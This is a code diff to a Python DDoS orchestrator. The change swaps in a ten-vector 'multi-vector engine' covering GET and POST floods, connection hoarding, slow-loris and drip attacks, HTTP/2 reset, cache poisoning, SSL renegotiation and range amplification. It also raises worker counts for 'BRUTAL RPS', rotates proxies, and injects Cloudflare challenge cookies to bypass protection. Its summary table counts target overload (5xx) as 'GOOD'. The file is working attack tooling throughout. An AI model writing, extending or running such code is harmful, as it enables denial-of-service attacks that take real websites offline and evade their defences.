@@ -28,8 +28,15 @@ from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import urlparse
 
-from core.attack.killer_engine import (
-    run_killer_engine,
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich import box
+
+_RICH_CONSOLE = Console()
+
+from core.attack.multi_vector_engine import (
+    run_multi_vector_engine,
 )
 from core.attack.raw_http_engine import (
     EngineMetrics,
@@ -67,6 +74,7 @@ class VectorDef:
     pool_size: int = 50
     pipeline_depth: int = 6
     path: Optional[str] = None  # override URL path
+    vector_mode: str = "all"
 
 
 @dataclass
@@ -94,12 +102,14 @@ class AutoModeV2:
         target_rps: int,
         config_path: str = "config/auto_mode.json",
         proxy_pool: Any = None,
+        cf_cookies: Optional[Dict[str, str]] = None,
     ) -> None:
         self.target = self._normalize_target(target)
         self.duration = max(10, int(duration))
         self.target_rps = max(50, int(target_rps))
         self.config = load_phase_config(config_path)
         self.proxy_pool = proxy_pool
+        self.cf_cookies = cf_cookies or {}  # Store CF cookies for injection
 
         # Extract proxy URLs and decide engine mode
         self.proxy_urls = extract_proxy_urls(proxy_pool) if proxy_pool else []
@@ -156,7 +166,7 @@ class AutoModeV2:
         """
         Define vectors based on engine mode:
         - Amplifier mode (proxy_pool >=10): curl_cffi + chrome impersonation + proxy rotation
-        - Raw mode (no proxy): raw HTTP/1.1 socket
+        - Raw mode (no proxy): raw HTTP/1.1 socket + Multi-Vector Engine (10 vectors total)
         """
         parsed = urlparse(self.target)
         base_path = parsed.path or "/"
@@ -181,18 +191,39 @@ class AutoModeV2:
                           path=f"{base_path}{sep}_=api"),
             ]
         else:
-            # Raw mode: HTTP/1.1 direct sockets - KILLER MODE
-            # Menggabungkan raw flood + connection hoarding + expensive payloads
-            vectors = [
-                VectorDef("killer_connhold", "KILLER: Conn Hold", rps_share=0.25,
-                          pool_size=500, pipeline_depth=1, path=base_path),
-                VectorDef("killer_flood", "KILLER: GET Flood", rps_share=0.30,
-                          pool_size=250, pipeline_depth=32, path=base_path),
-                VectorDef("killer_post", "KILLER: POST Bomb", rps_share=0.25,
-                          pool_size=200, pipeline_depth=1, path=base_path),
-                VectorDef("killer_slow", "KILLER: Slow Loris", rps_share=0.20,
-                          pool_size=200, pipeline_depth=1, path=base_path),
-            ]
+            # Raw mode: Multi-vector engine - 10 vectors total
+            if not self.use_amplifier:
+                vectors = [
+                    VectorDef("mv_connhold", "Connection Hold", rps_share=0.10,
+                              pool_size=1000, pipeline_depth=1, vector_mode="connhold"),
+                    
+                    VectorDef("mv_flood", "GET Flood", rps_share=0.15,
+                              pool_size=1000, pipeline_depth=30, vector_mode="flood"),
+                    
+                    VectorDef("mv_post", "POST Bomb", rps_share=0.12,
+                              pool_size=500, pipeline_depth=10, vector_mode="post"),
+                    
+                    VectorDef("mv_slow", "Slow Rate", rps_share=0.05,
+                              pool_size=200, pipeline_depth=1, vector_mode="slow"),
+                    
+                    VectorDef("mv_h2reset", "HTTP/2 Reset", rps_share=0.25,
+                              pool_size=100, pipeline_depth=1, vector_mode="h2reset"),
+                    
+                    VectorDef("mv_drip", "Slow Drip", rps_share=0.08,
+                              pool_size=300, pipeline_depth=1, vector_mode="drip"),
+                    
+                    VectorDef("mv_cdnpoison", "Cache Poison", rps_share=0.10,
+                              pool_size=500, pipeline_depth=5, vector_mode="cdnpoison"),
+                    
+                    VectorDef("mv_resexh", "Resource Exhaust", rps_share=0.10,
+                              pool_size=300, pipeline_depth=3, vector_mode="resexh"),
+                    
+                    VectorDef("mv_sslreneg", "SSL Reneg", rps_share=0.03,
+                              pool_size=100, pipeline_depth=1, vector_mode="sslreneg"),
+                    
+                    VectorDef("mv_rangeamp", "Range Amp", rps_share=0.02,
+                              pool_size=200, pipeline_depth=1, vector_mode="rangeamp"),
+                ]
         return vectors
 
     def _split_target_rps_per_worker(self, vector: VectorDef, num_workers: int) -> int:
@@ -362,15 +393,14 @@ class AutoModeV2:
         if self.use_amplifier:
             proxy_count = len(self.proxy_urls)
             if proxy_count >= 500:
-                workers_per_vector = min(6, max(3, cpu_count // 2))  # 1000 proxies = 6 workers
+                workers_per_vector = min(8, max(4, cpu_count // 2))  # UPGRADED: 6 → 8
             elif proxy_count >= 100:
-                workers_per_vector = min(4, max(2, cpu_count // 3))
+                workers_per_vector = min(6, max(3, cpu_count // 3))  # UPGRADED: 4 → 6
             else:
-                workers_per_vector = max(1, min(2, cpu_count // 4))
+                workers_per_vector = max(2, min(3, cpu_count // 4))
         else:
-            # EXTREME MODE (STABLE): Killer engine with multiple workers
-            # More workers = more parallel connections = higher RPS
-            workers_per_vector = min(3, max(2, cpu_count // 3))  # 3 workers for stability
+            # SUPER AGGRESSIVE MODE: More workers = more parallel connections = BRUTAL RPS
+            workers_per_vector = min(8, max(6, cpu_count // 2))  # UPGRADED: 3 → 8 workers
 
         stats_q = self.dashboard.get_stats_queue()
 
@@ -403,11 +433,10 @@ class AutoModeV2:
                 # Use a large value so only _shutdown_workers() stops them.
                 remaining_duration = float(self.duration) * 10.0
 
-                if v.name.startswith("killer_"):
-                    # KILLER ENGINE - multi-vector connection exhaustion
+                if v.name.startswith("mv_"):
                     th = threading.Thread(
-                        target=run_killer_engine,
-                        name=f"killer_{v.name}_{w_idx}",
+                        target=run_multi_vector_engine,
+                        name=f"mvector_{v.name}_{w_idx}",
                         kwargs=dict(
                             target_url=vector_target,
                             duration_seconds=remaining_duration,
@@ -417,6 +446,7 @@ class AutoModeV2:
                             stop_event=stop_evt,
                             proxy_urls=self.proxy_urls if self.proxy_urls else None,
                             result_dict=result,
+                            vector_mode=v.vector_mode,
                         ),
                         daemon=True,
                     )
@@ -436,6 +466,7 @@ class AutoModeV2:
                             concurrent_per_worker=500,
                             vector_name=v.name,
                             result_dict=result,
+                            cf_cookies=self.cf_cookies,  # INJECT CF COOKIES!
                         ),
                         daemon=True,
                     )
@@ -701,6 +732,7 @@ async def run_auto_mode_v2(
     target_rps: int,
     config_path: str = "config/auto_mode.json",
     proxy_pool: Any = None,
+    cf_cookies: Optional[Dict[str, str]] = None,
 ) -> Dict[str, Any]:
     """
     Run the redesigned Auto Mode v2.
@@ -711,6 +743,7 @@ async def run_auto_mode_v2(
         target_rps: peak target RPS
         config_path: path to auto_mode.json
         proxy_pool: optional ProxyPool (currently unused by raw engine)
+        cf_cookies: Cloudflare cookies from challenge solver
 
     Returns:
         dict with aggregated metrics
@@ -721,6 +754,7 @@ async def run_auto_mode_v2(
         target_rps=target_rps,
         config_path=config_path,
         proxy_pool=proxy_pool,
+        cf_cookies=cf_cookies,
     )
     return await orchestrator.run()
 
@@ -731,53 +765,98 @@ async def run_auto_mode_v2(
 
 def print_auto_mode_v2_summary(result: Dict[str, Any]) -> None:
     """Print a clean summary of Auto Mode v2 result."""
-    print()
-    print("=" * 70)
-    print("  AUTO MODE V2 SUMMARY")
-    print("=" * 70)
-    print(f"  Target:           {result.get('target', '?')}")
-    print(f"  Duration:         {result.get('duration', 0):.0f}s")
-    print(f"  Target RPS:       {result.get('target_rps', 0)}")
-    print(f"  Engine:           {result.get('engine', '?')}")
+    
+    # Main summary table
+    summary = Table(title="[bold cyan]AUTO MODE V2 SUMMARY[/]", box=box.HEAVY_EDGE,
+                    border_style="cyan")
+    summary.add_column("Metric", style="bold white", width=20)
+    summary.add_column("Value", justify="right", ratio=1)
+    
+    summary.add_row("Target", f"[cyan]{result.get('target', '?')}[/]")
+    summary.add_row("Duration", f"{result.get('duration', 0):.0f}s")
+    summary.add_row("Target RPS", f"{result.get('target_rps', 0)}")
+    summary.add_row("Engine", f"[yellow]{result.get('engine', '?')}[/]")
     if result.get('proxy_count', 0) > 0:
-        print(f"  Proxy Pool:       {result['proxy_count']} proxies")
-    print()
-    print(f"  Total Sent:       {result.get('total_requests', 0):,}")
-    print(f"  Completed:        {result.get('completed', 0):,}")
-    print(f"  Failed:           {result.get('failed', 0):,}")
-    print(f"  Timeout:          {result.get('timeout', 0):,}")
-    print(f"  Actual RPS:       {result.get('actual_rps', 0):.1f}")
-    print()
+        summary.add_row("Proxy Pool", f"[green]{result['proxy_count']}[/] proxies")
+    summary.add_row("", "")
+    summary.add_row("Total Sent", f"[bright_blue]{result.get('total_requests', 0):,}[/]")
+    summary.add_row("Completed", f"[green]{result.get('completed', 0):,}[/]")
+    summary.add_row("Failed", f"[red]{result.get('failed', 0):,}[/]")
+    summary.add_row("Timeout", f"[yellow]{result.get('timeout', 0):,}[/]")
+    summary.add_row("Actual RPS", f"[bold yellow]{result.get('actual_rps', 0):.1f}[/]")
+    
+    _RICH_CONSOLE.print()
+    _RICH_CONSOLE.print(summary)
+    
     # Amplifier-specific metrics
     if result.get('engine') == 'amplifier':
-        print(f"  Origin OK (2xx):  {result.get('origin_ok', 0):,}  (these REACHED target)")
-        print(f"  Origin Down (5xx):{result.get('origin_down', 0):,}  (target overloaded - GOOD)")
-        print(f"  CF Blocked (403): {result.get('cf_blocked', 0):,}  (proxy IP blacklisted by CF)")
-        print(f"  CF Challenge:     {result.get('cf_challenge', 0):,}  (CF served challenge page)")
-        print(f"  Bytes Received:   {result.get('bytes_received', 0):,}")
+        amp_table = Table(box=box.SIMPLE, border_style="bright_black")
+        amp_table.add_column("Metric", style="bold white")
+        amp_table.add_column("Value", justify="right")
+        amp_table.add_row("Origin OK (2xx)", f"[green]{result.get('origin_ok', 0):,}[/] (these REACHED target)")
+        amp_table.add_row("Origin Down (5xx)", f"[red]{result.get('origin_down', 0):,}[/] (target overloaded - GOOD)")
+        amp_table.add_row("CF Blocked (403)", f"[yellow]{result.get('cf_blocked', 0):,}[/] (proxy IP blacklisted by CF)")
+        amp_table.add_row("CF Challenge", f"[yellow]{result.get('cf_challenge', 0):,}[/] (CF served challenge page)")
+        amp_table.add_row("Bytes Received", f"[bright_blue]{result.get('bytes_received', 0):,}[/]")
+        _RICH_CONSOLE.print(amp_table)
+        
         ps = result.get('proxy_stats', {})
         if ps:
-            print()
-            print(f"  Proxy Stats:")
-            print(f"    Healthy:        {ps.get('healthy', 0)} / {ps.get('total', 0)}")
-            print(f"    Blacklisted:    {ps.get('blacklisted', 0)}")
-            print(f"    Total picks:    {ps.get('picks', 0):,}")
-            print(f"    No-available:   {ps.get('no_available', 0):,}")
+            proxy_table = Table(title="Proxy Stats", box=box.SIMPLE, border_style="bright_black")
+            proxy_table.add_column("Metric", style="bold white")
+            proxy_table.add_column("Value", justify="right")
+            proxy_table.add_row("Healthy", f"[green]{ps.get('healthy', 0)}[/] / {ps.get('total', 0)}")
+            proxy_table.add_row("Blacklisted", f"[red]{ps.get('blacklisted', 0)}[/]")
+            proxy_table.add_row("Total picks", f"[bright_blue]{ps.get('picks', 0):,}[/]")
+            proxy_table.add_row("No-available", f"[yellow]{ps.get('no_available', 0):,}[/]")
+            _RICH_CONSOLE.print(proxy_table)
     else:
-        print(f"  Local Drops:      {result.get('local_drops', 0):,}")
-        print(f"  WSA Blocks:       {result.get('wsa_blocks', 0):,}")
-        print(f"  Bytes Sent:       {result.get('bytes_sent', 0):,}")
-    print()
+        extra_table = Table(box=box.SIMPLE, border_style="bright_black")
+        extra_table.add_column("Metric", style="bold white")
+        extra_table.add_column("Value", justify="right")
+        extra_table.add_row("Local Drops", f"[red]{result.get('local_drops', 0):,}[/]")
+        extra_table.add_row("WSA Blocks", f"[yellow]{result.get('wsa_blocks', 0):,}[/]")
+        extra_table.add_row("Bytes Sent", f"[bright_blue]{result.get('bytes_sent', 0):,}[/]")
+        _RICH_CONSOLE.print(extra_table)
+    
+    # Per-vector breakdown
     if result.get("vectors"):
-        print("  Per Vector:")
-        for v in result["vectors"]:
-            if result.get('engine') == 'amplifier':
-                print(f"    {v['name']:<20} sent={v['sent']:>7} ok={v['origin_ok']:>5} "
-                      f"down={v['origin_down']:>5} cf_block={v['cf_blocked']:>5} "
-                      f"cf_chal={v['cf_challenge']:>4} fail={v['failed']:>4}")
-            else:
-                print(f"    {v['name']:<20} sent={v['sent']:>8} ok={v['completed']:>6} "
-                      f"fail={v['failed']:>6} drop={v.get('local_drops', 0):>4} "
-                      f"wsa={v.get('wsa_blocks', 0):>4}")
-    print("=" * 70)
-    print()
+        vec_table = Table(title="Per Vector Breakdown", box=box.SIMPLE,
+                          border_style="bright_black")
+        if result.get('engine') == 'amplifier':
+            vec_table.add_column("Vector", style="bold white")
+            vec_table.add_column("Sent", justify="right")
+            vec_table.add_column("Origin OK", justify="right")
+            vec_table.add_column("Down", justify="right")
+            vec_table.add_column("CF Block", justify="right")
+            vec_table.add_column("CF Chal", justify="right")
+            vec_table.add_column("Fail", justify="right")
+            for v in result["vectors"]:
+                vec_table.add_row(
+                    v['name'],
+                    f"{v['sent']:,}",
+                    f"[green]{v['origin_ok']:,}[/]",
+                    f"[red]{v['origin_down']:,}[/]",
+                    f"[yellow]{v['cf_blocked']:,}[/]",
+                    f"[yellow]{v['cf_challenge']:,}[/]",
+                    f"[red]{v['failed']:,}[/]",
+                )
+        else:
+            vec_table.add_column("Vector", style="bold white")
+            vec_table.add_column("Sent", justify="right")
+            vec_table.add_column("OK", justify="right")
+            vec_table.add_column("Fail", justify="right")
+            vec_table.add_column("Drop", justify="right")
+            vec_table.add_column("WSA", justify="right")
+            for v in result["vectors"]:
+                vec_table.add_row(
+                    v['name'],
+                    f"{v['sent']:,}",
+                    f"[green]{v['completed']:,}[/]",
+                    f"[red]{v['failed']:,}[/]",
+                    f"[yellow]{v.get('local_drops', 0):,}[/]",
+                    f"[yellow]{v.get('wsa_blocks', 0):,}[/]",
+                )
+        _RICH_CONSOLE.print(vec_table)
+    
+    _RICH_CONSOLE.print()
